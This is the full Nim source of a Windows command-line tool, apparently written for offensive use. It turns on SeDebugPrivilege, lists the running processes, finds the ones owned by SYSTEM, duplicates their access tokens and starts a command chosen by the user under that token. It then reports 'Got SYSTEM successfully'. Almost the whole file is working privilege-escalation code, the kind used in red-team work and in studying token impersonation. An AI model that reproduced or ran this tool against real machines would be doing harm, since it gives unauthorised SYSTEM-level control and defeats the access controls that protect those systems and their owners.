import os
import winim
import winim/lean
import winim/inc/windef
import winim/inc/winbase
import winim/inc/objbase
from std/winlean import getLastError

var cmdline = ""
var isVerbose = false
let systemSID = "S-1-5-18"


proc convertSidToStringSidA(Sid: PSID, StringSir: ptr LPSTR): NTSTATUS {.cdecl, importc: "ConvertSidToStringSidA", dynlib: "Advapi32.dll".}


proc printHelp(): void =
    var filepath = getAppFilename().splitFile()[1] & getAppFilename().splitFile()[2]
    echo "[i] Usage: " & filepath & " [-v|--verbose] [-h|--help] <cmdline>"
    echo "[i] Example: " & filepath & " powershell"
    echo "[i] Example: " & filepath & " --verbose \"cmd /k whoami\""
    quit()


proc SetPrivilege(lpszPrivilege:string): bool=
    # inits
    var tp : TOKEN_PRIVILEGES
    var luid: LUID 
    var HTtoken: HANDLE
    # open current process token
    discard OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &HTtoken)
    # get current privilege
    if LookupPrivilegeValue(NULL, lpszPrivilege, &luid) == 0:
        return false
    # enable privilege
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    # set privilege
    if AdjustTokenPrivileges(HTtoken, FALSE, &tp, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), NULL, NULL) == 0:
        return false
    # success
    return true


proc sidToString(sid: PSID): string =
    var lpSid: LPSTR
    discard convertSidToStringSidA(sid, addr lpSid)
    return $cstring(lpSid)


proc isProcessSystem(pid: int): bool =
    # inits
    var hProcess: HANDLE
    var hToken: HANDLE
    var pUser: TOKEN_USER
    var dwLength: DWORD
    var dwPid = cast[DWORD](pid)
    var isSystem = false
    # open process
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid)
    defer: CloseHandle(hProcess)
    if hProcess == cast[DWORD](-1) or hProcess == cast[DWORD](NULL):
        return
    # open process token
    if OpenProcessToken(hProcess, TOKEN_QUERY, cast[PHANDLE](hToken.addr)) == FALSE:
        return
    defer: CloseHandle(hToken)
    if hToken == cast[HANDLE](-1) or hToken == cast[HANDLE](NULL):
        return
    # get required buffer size and allocate the TOKEN_USER buffer
    GetTokenInformation(hToken, tokenUser, cast[LPVOID](pUser.addr), cast[DWORD](0), cast[PDWORD](dwLength.addr))
    # extract token information
    GetTokenInformation(hToken, tokenUser, pUser.addr, cast[DWORD](dwLength), cast[PDWORD](dwLength.addr))
    # extract the SID from the token and compare with SYSTEM
    if sidToString(pUser.User.Sid) == systemSID:
        isSystem = true
    return isSystem


proc dupicateAndExecute(pid: int): void =
    # inits
    var is_success: BOOL
    var hProcess: HANDLE
    var hToken: HANDLE
    var newToken: HANDLE
    var si: STARTUPINFO
    var pi: PROCESS_INFORMATION  
    if isVerbose:
        echo "[*] Trying to duplicate process " & $pid & " token" 
    # open process
    hProcess = OpenProcess(MAXIMUM_ALLOWED, TRUE, pid.DWORD)
    defer: CloseHandle(hProcess)
    if hProcess == 0:
        if isVerbose:
            echo "[-] Failed to open process handle: " & $getLastError()
        return
    # open process token
    is_success = OpenProcessToken(hProcess, MAXIMUM_ALLOWED, addr hToken)
    if is_success == FALSE:
        if isVerbose:
            echo "[-] Failed to open process token: "  & $getLastError()
        return
    # duplicate process token
    is_success = DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nil, securityImpersonation, tokenPrimary, addr newToken)
    if bool(is_success) == FALSE:
        if isVerbose:
            echo "[-] Failed to duplicate token:" & $getLastError()
        return
    # create SYSTEM process using the token
    si.cb = sizeof(si).DWORD
    is_success = CreateProcessWithTokenW(newToken,LOGON_NETCREDENTIALS_ONLY, nil, cmdline, 0, nil, NULL, addr si, addr pi)
    if bool(is_success) == FALSE:
        if isVerbose:
            echo "[-] Failed to create process: " & $getLastError()
        quit()
    else:
        echo "[+] Got SYSTEM successfully :)"
        quit()
    # cleanup
    CloseHandle(newToken)
    CloseHandle(hToken)


proc main(): void =
    # parse args
    let params = commandLineParams()
    var gotCommand = false
    for p in params:
        if p in ["-h", "--help"]:
            printHelp()
        elif p in ["-v", "--verbose"]:
            isVerbose = true
        else:
            gotCommand = true
            cmdline = p
    if not gotCommand:
        printHelp()
    # inits
    var entry: PROCESSENTRY32
    var hSnapshot: HANDLE
    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    # enable SeDebugPrivilege
    if isVerbose:
        echo "[*] Enabling SeDebugPrivilege"
    if not SetPrivilege("SeDebugPrivilege"):
        echo "[-] Failed to enable SeDebugPrivilege"
        quit()
    if isVerbose:
        echo "[*] Calling CreateToolhelp32Snapshot"
    # get all processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)
    if Process32First(hSnapshot, addr entry):
        # iterate all processes and try to steal token from each SYSTEM process
        while Process32Next(hSnapshot, addr entry):
            if isProcessSystem(entry.th32ProcessID):
                dupicateAndExecute(entry.th32ProcessID)


main()
